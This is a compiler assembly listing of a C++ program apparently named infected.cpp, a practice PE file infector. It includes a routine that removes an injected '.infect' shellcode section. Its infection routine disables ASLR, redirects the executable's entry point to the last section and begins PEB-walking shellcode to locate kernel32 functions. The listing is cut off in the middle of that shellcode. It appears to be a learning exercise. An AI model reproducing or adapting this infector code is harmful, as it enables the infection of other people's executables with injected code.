; 340  :         cerr << "Error: Fail to load file" << endl;

  000b8	68 00 00 00 00	 push	 OFFSET $SG147869
  000bd	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  000c2	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  000c7	83 c4 08	 add	 esp, 8
  000ca	89 45 cc	 mov	 DWORD PTR tv141[ebp], eax
  000cd	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  000d2	8b 4d cc	 mov	 ecx, DWORD PTR tv141[ebp]
  000d5	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 341  :         return false;

  000da	32 c0		 xor	 al, al
  000dc	e9 a4 02 00 00	 jmp	 $LN1@RecoverFil
$LN7@RecoverFil:

; 342  :     }
; 343  : 
; 344  :     // Set some variable
; 345  :     DWORD byteWritten = 0;

  000e1	c7 45 e4 00 00
	00 00		 mov	 DWORD PTR _byteWritten$[ebp], 0

; 346  :     DWORD fileSize = GetFileSize(hFile, NULL);

  000e8	6a 00		 push	 0
  000ea	8b 45 f8	 mov	 eax, DWORD PTR _hFile$[ebp]
  000ed	50		 push	 eax
  000ee	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetFileSize@8
  000f4	89 45 ec	 mov	 DWORD PTR _fileSize$[ebp], eax

; 347  :     unsigned char *pByte = (unsigned char *)malloc(fileSize);

  000f7	8b 4d ec	 mov	 ecx, DWORD PTR _fileSize$[ebp]
  000fa	51		 push	 ecx
  000fb	e8 00 00 00 00	 call	 _malloc
  00100	83 c4 04	 add	 esp, 4
  00103	89 45 f0	 mov	 DWORD PTR _pByte$[ebp], eax

; 348  : 
; 349  :     if (pByte == NULL)

  00106	83 7d f0 00	 cmp	 DWORD PTR _pByte$[ebp], 0
  0010a	75 29		 jne	 SHORT $LN8@RecoverFil

; 350  :     {
; 351  :         cerr << "Error: Fail to load file" << endl;

  0010c	68 00 00 00 00	 push	 OFFSET $SG147871
  00111	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  00116	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0011b	83 c4 08	 add	 esp, 8
  0011e	89 45 c8	 mov	 DWORD PTR tv157[ebp], eax
  00121	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  00126	8b 4d c8	 mov	 ecx, DWORD PTR tv157[ebp]
  00129	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 352  :         return false;

  0012e	32 c0		 xor	 al, al
  00130	e9 50 02 00 00	 jmp	 $LN1@RecoverFil
$LN8@RecoverFil:

; 353  :     }
; 354  : 
; 355  :     ReadFile(hFile, pByte, fileSize, &byteWritten, NULL);

  00135	6a 00		 push	 0
  00137	8d 55 e4	 lea	 edx, DWORD PTR _byteWritten$[ebp]
  0013a	52		 push	 edx
  0013b	8b 45 ec	 mov	 eax, DWORD PTR _fileSize$[ebp]
  0013e	50		 push	 eax
  0013f	8b 4d f0	 mov	 ecx, DWORD PTR _pByte$[ebp]
  00142	51		 push	 ecx
  00143	8b 55 f8	 mov	 edx, DWORD PTR _hFile$[ebp]
  00146	52		 push	 edx
  00147	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__ReadFile@20

; 356  :     if (byteWritten != fileSize)

  0014d	8b 45 e4	 mov	 eax, DWORD PTR _byteWritten$[ebp]
  00150	3b 45 ec	 cmp	 eax, DWORD PTR _fileSize$[ebp]
  00153	74 29		 je	 SHORT $LN9@RecoverFil

; 357  :     {
; 358  :         cerr << "Error: Fail to read file" << endl;

  00155	68 00 00 00 00	 push	 OFFSET $SG147873
  0015a	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  0015f	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00164	83 c4 08	 add	 esp, 8
  00167	89 45 c4	 mov	 DWORD PTR tv170[ebp], eax
  0016a	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0016f	8b 4d c4	 mov	 ecx, DWORD PTR tv170[ebp]
  00172	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 359  :         return false;

  00177	32 c0		 xor	 al, al
  00179	e9 07 02 00 00	 jmp	 $LN1@RecoverFil
$LN9@RecoverFil:

; 360  :     }
; 361  : 
; 362  :     // Get header of file
; 363  :     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;

  0017e	8b 4d f0	 mov	 ecx, DWORD PTR _pByte$[ebp]
  00181	89 4d dc	 mov	 DWORD PTR _pDosHeader$[ebp], ecx

; 364  :     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)

  00184	8b 55 dc	 mov	 edx, DWORD PTR _pDosHeader$[ebp]
  00187	0f b7 02	 movzx	 eax, WORD PTR [edx]
  0018a	3d 4d 5a 00 00	 cmp	 eax, 23117		; 00005a4dH
  0018f	74 29		 je	 SHORT $LN10@RecoverFil

; 365  :     {
; 366  :         cout << "Error: Fail to load DOS header" << endl;

  00191	68 00 00 00 00	 push	 OFFSET $SG147875
  00196	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  0019b	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  001a0	83 c4 08	 add	 esp, 8
  001a3	89 45 c0	 mov	 DWORD PTR tv180[ebp], eax
  001a6	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  001ab	8b 4d c0	 mov	 ecx, DWORD PTR tv180[ebp]
  001ae	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 367  :         return false;

  001b3	32 c0		 xor	 al, al
  001b5	e9 cb 01 00 00	 jmp	 $LN1@RecoverFil
$LN10@RecoverFil:

; 368  :     }
; 369  : 
; 370  :     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);

  001ba	8b 4d dc	 mov	 ecx, DWORD PTR _pDosHeader$[ebp]
  001bd	8b 55 f0	 mov	 edx, DWORD PTR _pByte$[ebp]
  001c0	03 51 3c	 add	 edx, DWORD PTR [ecx+60]
  001c3	89 55 fc	 mov	 DWORD PTR _pNtHeader$[ebp], edx

; 371  :     if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)

  001c6	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  001c9	81 38 50 45 00
	00		 cmp	 DWORD PTR [eax], 17744	; 00004550H
  001cf	74 29		 je	 SHORT $LN11@RecoverFil

; 372  :     {
; 373  :         cout << "Error: Fail to load NT header" << endl;

  001d1	68 00 00 00 00	 push	 OFFSET $SG147877
  001d6	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  001db	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  001e0	83 c4 08	 add	 esp, 8
  001e3	89 45 bc	 mov	 DWORD PTR tv191[ebp], eax
  001e6	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  001eb	8b 4d bc	 mov	 ecx, DWORD PTR tv191[ebp]
  001ee	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 374  :         return false;

  001f3	32 c0		 xor	 al, al
  001f5	e9 8b 01 00 00	 jmp	 $LN1@RecoverFil
$LN11@RecoverFil:

; 375  :     }
; 376  : 
; 377  :     // Get address of section
; 378  :     uint32_t entryPoint = GetEntryPoint(pNtHeader, pByte);

  001fa	8b 4d f0	 mov	 ecx, DWORD PTR _pByte$[ebp]
  001fd	51		 push	 ecx
  001fe	8b 55 fc	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00201	52		 push	 edx
  00202	e8 00 00 00 00	 call	 ?GetEntryPoint@@YAIPAU_IMAGE_NT_HEADERS@@PAE@Z ; GetEntryPoint
  00207	83 c4 08	 add	 esp, 8
  0020a	89 45 b8	 mov	 DWORD PTR _entryPoint$[ebp], eax

; 379  :     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeader);

  0020d	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00210	0f b7 48 14	 movzx	 ecx, WORD PTR [eax+20]
  00214	8b 55 fc	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00217	8d 44 0a 18	 lea	 eax, DWORD PTR [edx+ecx+24]
  0021b	89 45 e8	 mov	 DWORD PTR _section$[ebp], eax

; 380  :     PIMAGE_SECTION_HEADER lastSection = section + pNtHeader->FileHeader.NumberOfSections - 1;

  0021e	8b 4d fc	 mov	 ecx, DWORD PTR _pNtHeader$[ebp]
  00221	0f b7 51 06	 movzx	 edx, WORD PTR [ecx+6]
  00225	6b c2 28	 imul	 eax, edx, 40
  00228	8b 4d e8	 mov	 ecx, DWORD PTR _section$[ebp]
  0022b	8d 54 01 d8	 lea	 edx, DWORD PTR [ecx+eax-40]
  0022f	89 55 b0	 mov	 DWORD PTR _lastSection$[ebp], edx

; 381  :     pNtHeader->OptionalHeader.AddressOfEntryPoint = entryPoint - pNtHeader->OptionalHeader.ImageBase;

  00232	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00235	8b 4d b8	 mov	 ecx, DWORD PTR _entryPoint$[ebp]
  00238	2b 48 34	 sub	 ecx, DWORD PTR [eax+52]
  0023b	8b 55 fc	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  0023e	89 4a 28	 mov	 DWORD PTR [edx+40], ecx

; 382  : 
; 383  :     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

  00241	6a 00		 push	 0
  00243	6a 00		 push	 0
  00245	6a 00		 push	 0
  00247	8b 45 f8	 mov	 eax, DWORD PTR _hFile$[ebp]
  0024a	50		 push	 eax
  0024b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetFilePointer@16

; 384  :     UnmapViewOfFile(lpBase);

  00251	8b 4d d8	 mov	 ecx, DWORD PTR _lpBase$[ebp]
  00254	51		 push	 ecx
  00255	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__UnmapViewOfFile@4

; 385  :     CloseHandle(hMap);

  0025b	8b 55 e0	 mov	 edx, DWORD PTR _hMap$[ebp]
  0025e	52		 push	 edx
  0025f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 386  :     WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);

  00265	6a 00		 push	 0
  00267	8d 45 e4	 lea	 eax, DWORD PTR _byteWritten$[ebp]
  0026a	50		 push	 eax
  0026b	8b 4d ec	 mov	 ecx, DWORD PTR _fileSize$[ebp]
  0026e	51		 push	 ecx
  0026f	8b 55 f0	 mov	 edx, DWORD PTR _pByte$[ebp]
  00272	52		 push	 edx
  00273	8b 45 f8	 mov	 eax, DWORD PTR _hFile$[ebp]
  00276	50		 push	 eax
  00277	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WriteFile@20

; 387  : 
; 388  :     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

  0027d	6a 00		 push	 0
  0027f	6a 00		 push	 0
  00281	6a 00		 push	 0
  00283	8b 4d f8	 mov	 ecx, DWORD PTR _hFile$[ebp]
  00286	51		 push	 ecx
  00287	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetFilePointer@16

; 389  :     for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)

  0028d	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR _i$1[ebp], 0
  00294	eb 09		 jmp	 SHORT $LN4@RecoverFil
$LN2@RecoverFil:
  00296	8b 55 f4	 mov	 edx, DWORD PTR _i$1[ebp]
  00299	83 c2 01	 add	 edx, 1
  0029c	89 55 f4	 mov	 DWORD PTR _i$1[ebp], edx
$LN4@RecoverFil:
  0029f	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  002a2	0f b7 48 06	 movzx	 ecx, WORD PTR [eax+6]
  002a6	39 4d f4	 cmp	 DWORD PTR _i$1[ebp], ecx
  002a9	7d 7d		 jge	 SHORT $LN3@RecoverFil

; 390  :     {
; 391  :         if (strcmp((char *)section[i].Name, ".infect") == 0)

  002ab	68 00 00 00 00	 push	 OFFSET $SG147879
  002b0	6b 55 f4 28	 imul	 edx, DWORD PTR _i$1[ebp], 40
  002b4	03 55 e8	 add	 edx, DWORD PTR _section$[ebp]
  002b7	52		 push	 edx
  002b8	e8 00 00 00 00	 call	 _strcmp
  002bd	83 c4 08	 add	 esp, 8
  002c0	85 c0		 test	 eax, eax
  002c2	75 5f		 jne	 SHORT $LN12@RecoverFil

; 392  :         {
; 393  :             // delete the shellcode section
; 394  :             memmove(&section[i], &section[i + 1], (pNtHeader->FileHeader.NumberOfSections - i - 1) * sizeof(IMAGE_SECTION_HEADER));

  002c4	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  002c7	0f b7 48 06	 movzx	 ecx, WORD PTR [eax+6]
  002cb	2b 4d f4	 sub	 ecx, DWORD PTR _i$1[ebp]
  002ce	83 e9 01	 sub	 ecx, 1
  002d1	6b d1 28	 imul	 edx, ecx, 40
  002d4	52		 push	 edx
  002d5	8b 45 f4	 mov	 eax, DWORD PTR _i$1[ebp]
  002d8	83 c0 01	 add	 eax, 1
  002db	6b c8 28	 imul	 ecx, eax, 40
  002de	03 4d e8	 add	 ecx, DWORD PTR _section$[ebp]
  002e1	51		 push	 ecx
  002e2	6b 55 f4 28	 imul	 edx, DWORD PTR _i$1[ebp], 40
  002e6	03 55 e8	 add	 edx, DWORD PTR _section$[ebp]
  002e9	52		 push	 edx
  002ea	e8 00 00 00 00	 call	 _memmove
  002ef	83 c4 0c	 add	 esp, 12			; 0000000cH

; 395  :             pNtHeader->FileHeader.NumberOfSections -= 1;

  002f2	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  002f5	0f b7 48 06	 movzx	 ecx, WORD PTR [eax+6]
  002f9	83 e9 01	 sub	 ecx, 1
  002fc	8b 55 fc	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  002ff	66 89 4a 06	 mov	 WORD PTR [edx+6], cx

; 396  :             pNtHeader->OptionalHeader.SizeOfImage -= sizeof(IMAGE_SECTION_HEADER);

  00303	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00306	8b 48 50	 mov	 ecx, DWORD PTR [eax+80]
  00309	83 e9 28	 sub	 ecx, 40			; 00000028H
  0030c	8b 55 fc	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  0030f	89 4a 50	 mov	 DWORD PTR [edx+80], ecx

; 397  :             pNtHeader->OptionalHeader.SizeOfHeaders -= sizeof(IMAGE_SECTION_HEADER);

  00312	8b 45 fc	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00315	8b 48 54	 mov	 ecx, DWORD PTR [eax+84]
  00318	83 e9 28	 sub	 ecx, 40			; 00000028H
  0031b	8b 55 fc	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  0031e	89 4a 54	 mov	 DWORD PTR [edx+84], ecx

; 398  :             break;

  00321	eb 05		 jmp	 SHORT $LN3@RecoverFil
$LN12@RecoverFil:

; 399  :         }
; 400  :     }

  00323	e9 6e ff ff ff	 jmp	 $LN2@RecoverFil
$LN3@RecoverFil:

; 401  : 
; 402  :     SetEndOfFile(hFile);

  00328	8b 45 f8	 mov	 eax, DWORD PTR _hFile$[ebp]
  0032b	50		 push	 eax
  0032c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetEndOfFile@4

; 403  :     WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);

  00332	6a 00		 push	 0
  00334	8d 4d e4	 lea	 ecx, DWORD PTR _byteWritten$[ebp]
  00337	51		 push	 ecx
  00338	8b 55 ec	 mov	 edx, DWORD PTR _fileSize$[ebp]
  0033b	52		 push	 edx
  0033c	8b 45 f0	 mov	 eax, DWORD PTR _pByte$[ebp]
  0033f	50		 push	 eax
  00340	8b 4d f8	 mov	 ecx, DWORD PTR _hFile$[ebp]
  00343	51		 push	 ecx
  00344	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WriteFile@20

; 404  :     CloseHandle(hFile);

  0034a	8b 55 f8	 mov	 edx, DWORD PTR _hFile$[ebp]
  0034d	52		 push	 edx
  0034e	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 405  : 
; 406  :     cerr << "Success to recover file " << fileName << endl;

  00354	68 00 00 00 00	 push	 OFFSET $SG147880
  00359	68 00 00 00 00	 push	 OFFSET ?cerr@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cerr
  0035e	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00363	83 c4 08	 add	 esp, 8
  00366	8b 4d 08	 mov	 ecx, DWORD PTR _fileName$[ebp]
  00369	51		 push	 ecx
  0036a	50		 push	 eax
  0036b	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00370	83 c4 08	 add	 esp, 8
  00373	89 45 b4	 mov	 DWORD PTR tv285[ebp], eax
  00376	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0037b	8b 4d b4	 mov	 ecx, DWORD PTR tv285[ebp]
  0037e	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 407  :     return true;

  00383	b0 01		 mov	 al, 1
$LN1@RecoverFil:

; 408  : }

  00385	8b e5		 mov	 esp, ebp
  00387	5d		 pop	 ebp
  00388	c3		 ret	 0
?RecoverFile@@YA_NPBD@Z ENDP				; RecoverFile
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
_originEntryPoint$ = -12				; size = 4
_last$ = -8						; size = 4
_first$ = -4						; size = 4
_pNtHeader$ = 8						; size = 4
_pByte$ = 12						; size = 4
?GetEntryPoint@@YAIPAU_IMAGE_NT_HEADERS@@PAE@Z PROC	; GetEntryPoint

; 309  : uint32_t GetEntryPoint(PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 310  :     PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(pNtHeader);

  00006	8b 45 08	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00009	0f b7 48 14	 movzx	 ecx, WORD PTR [eax+20]
  0000d	8b 55 08	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00010	8d 44 0a 18	 lea	 eax, DWORD PTR [edx+ecx+24]
  00014	89 45 fc	 mov	 DWORD PTR _first$[ebp], eax

; 311  :     PIMAGE_SECTION_HEADER last = first + pNtHeader->FileHeader.NumberOfSections - 1;

  00017	8b 4d 08	 mov	 ecx, DWORD PTR _pNtHeader$[ebp]
  0001a	0f b7 51 06	 movzx	 edx, WORD PTR [ecx+6]
  0001e	6b c2 28	 imul	 eax, edx, 40
  00021	8b 4d fc	 mov	 ecx, DWORD PTR _first$[ebp]
  00024	8d 54 01 d8	 lea	 edx, DWORD PTR [ecx+eax-40]
  00028	89 55 f8	 mov	 DWORD PTR _last$[ebp], edx

; 312  :     // Point pByte to address offset 0x100 of last section
; 313  :     pByte += last->PointerToRawData + 0x100;

  0002b	8b 45 f8	 mov	 eax, DWORD PTR _last$[ebp]
  0002e	8b 48 14	 mov	 ecx, DWORD PTR [eax+20]
  00031	8b 55 0c	 mov	 edx, DWORD PTR _pByte$[ebp]
  00034	8d 84 0a 00 01
	00 00		 lea	 eax, DWORD PTR [edx+ecx+256]
  0003b	89 45 0c	 mov	 DWORD PTR _pByte$[ebp], eax

; 314  :     uint32_t originEntryPoint = *(uint32_t*)(pByte + 14);

  0003e	8b 4d 0c	 mov	 ecx, DWORD PTR _pByte$[ebp]
  00041	8b 51 0e	 mov	 edx, DWORD PTR [ecx+14]
  00044	89 55 f4	 mov	 DWORD PTR _originEntryPoint$[ebp], edx

; 315  :     return originEntryPoint;

  00047	8b 45 f4	 mov	 eax, DWORD PTR _originEntryPoint$[ebp]

; 316  : }

  0004a	8b e5		 mov	 esp, ebp
  0004c	5d		 pop	 ebp
  0004d	c3		 ret	 0
?GetEntryPoint@@YAIPAU_IMAGE_NT_HEADERS@@PAE@Z ENDP	; GetEntryPoint
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
_carrier$1 = -1040					; size = 4
_checkpoint$ = -1036					; size = 4
_OEP$ = -1032						; size = 4
_firstSection$ = -1028					; size = 4
_lastSection$ = -1024					; size = 4
_end$ = -1020						; size = 4
_invalidEP$ = -1016					; size = 4
_start$ = -1012						; size = 4
_order$ = -1008						; size = 4
_address$ = -1004					; size = 1000
__$ArrayPad$ = -4					; size = 4
_hFile$ = 8						; size = 4
_pNtHeader$ = 12					; size = 4
_pByte$ = 16						; size = 4
_fileSize$ = 20						; size = 4
_byteWritten$ = 24					; size = 4
?InflectSection@@YA_NAAPAXPAU_IMAGE_NT_HEADERS@@PAEKK@Z PROC ; InflectSection

; 71   : bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD byteWritten) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 10 04 00
	00		 sub	 esp, 1040		; 00000410H
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00013	53		 push	 ebx
  00014	56		 push	 esi
  00015	57		 push	 edi

; 72   : 
; 73   :     // Insert code into last section
; 74   :     PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);

  00016	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00019	0f b7 48 14	 movzx	 ecx, WORD PTR [eax+20]
  0001d	8b 55 0c	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00020	8d 44 0a 18	 lea	 eax, DWORD PTR [edx+ecx+24]
  00024	89 85 fc fb ff
	ff		 mov	 DWORD PTR _firstSection$[ebp], eax

; 75   :     PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);

  0002a	8b 4d 0c	 mov	 ecx, DWORD PTR _pNtHeader$[ebp]
  0002d	0f b7 51 06	 movzx	 edx, WORD PTR [ecx+6]
  00031	83 ea 01	 sub	 edx, 1
  00034	6b c2 28	 imul	 eax, edx, 40
  00037	03 85 fc fb ff
	ff		 add	 eax, DWORD PTR _firstSection$[ebp]
  0003d	89 85 00 fc ff
	ff		 mov	 DWORD PTR _lastSection$[ebp], eax

; 76   : 
; 77   :     SetFilePointer(hFile, 0, 0, FILE_BEGIN);

  00043	6a 00		 push	 0
  00045	6a 00		 push	 0
  00047	6a 00		 push	 0
  00049	8b 4d 08	 mov	 ecx, DWORD PTR _hFile$[ebp]
  0004c	8b 11		 mov	 edx, DWORD PTR [ecx]
  0004e	52		 push	 edx
  0004f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetFilePointer@16

; 78   :     // Save the OEP
; 79   :     DWORD OEP = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;

  00055	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  00058	8b 48 28	 mov	 ecx, DWORD PTR [eax+40]
  0005b	8b 55 0c	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  0005e	03 4a 34	 add	 ecx, DWORD PTR [edx+52]
  00061	89 8d f8 fb ff
	ff		 mov	 DWORD PTR _OEP$[ebp], ecx

; 80   : 
; 81   :     // Disable ASLR
; 82   :     pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

  00067	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  0006a	0f b7 48 5e	 movzx	 ecx, WORD PTR [eax+94]
  0006e	83 e1 bf	 and	 ecx, -65		; ffffffbfH
  00071	8b 55 0c	 mov	 edx, DWORD PTR _pNtHeader$[ebp]
  00074	66 89 4a 5e	 mov	 WORD PTR [edx+94], cx

; 83   :     // Change the EP to point to the last section created
; 84   :     pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;

  00078	8b 45 0c	 mov	 eax, DWORD PTR _pNtHeader$[ebp]
  0007b	8b 8d 00 fc ff
	ff		 mov	 ecx, DWORD PTR _lastSection$[ebp]
  00081	8b 51 0c	 mov	 edx, DWORD PTR [ecx+12]
  00084	89 50 28	 mov	 DWORD PTR [eax+40], edx

; 85   :     WriteFile(hFile, pByte, fileSize, &byteWritten, 0);

  00087	6a 00		 push	 0
  00089	8d 45 18	 lea	 eax, DWORD PTR _byteWritten$[ebp]
  0008c	50		 push	 eax
  0008d	8b 4d 14	 mov	 ecx, DWORD PTR _fileSize$[ebp]
  00090	51		 push	 ecx
  00091	8b 55 10	 mov	 edx, DWORD PTR _pByte$[ebp]
  00094	52		 push	 edx
  00095	8b 45 08	 mov	 eax, DWORD PTR _hFile$[ebp]
  00098	8b 08		 mov	 ecx, DWORD PTR [eax]
  0009a	51		 push	 ecx
  0009b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WriteFile@20

; 86   : 
; 87   :     // Obtain the opcodes
; 88   :     DWORD start(0), end(0);

  000a1	c7 85 0c fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _start$[ebp], 0
  000ab	c7 85 04 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _end$[ebp], 0

; 89   :     __asm{
; 90   :         mov eax, loc1

  000b5	b8 00 00 00 00	 mov	 eax, OFFSET $loc1$6

; 91   :         mov[start], eax

  000ba	89 85 0c fc ff
	ff		 mov	 DWORD PTR _start$[ebp], eax

; 92   :         //we jump over the second __asm,so we dont execute it in the infector itself
; 93   :         jmp over

  000c0	e9 95 01 00 00	 jmp	 $over$7
$loc1$6:

; 94   :         loc1:
; 95   :     }
; 96   :  
; 97   :     __asm{
; 98   :         /*
; 99   :             The purpose of this part is to read the base address of kernel32.dll
; 100  :             from PEB,walk it's export table (EAT) and search for functions
; 101  :         */
; 102  :         mov eax, fs:[30h]

  000c5	64 a1 30 00 00
	00		 mov	 eax, DWORD PTR fs:48

; 103  :         mov eax, [eax + 0x0c]; 12

  000cb	8b 40 0c	 mov	 eax, DWORD PTR [eax+12]

; 104  :         mov eax, [eax + 0x14]; 20

  000ce	8b 40 14	 mov	 eax, DWORD PTR [eax+20]

; 105  :         mov eax, [eax]

  000d1	8b 00		 mov	 eax, DWORD PTR [eax]

; 106  :         mov eax, [eax]

  000d3	8b 00		 mov	 eax, DWORD PTR [eax]

; 107  :         mov eax, [eax + 0x10]; 16

  000d5	8b 40 10	 mov	 eax, DWORD PTR [eax+16]

; 108  :  
; 109  :         mov   ebx, eax; Take the base address of kernel32

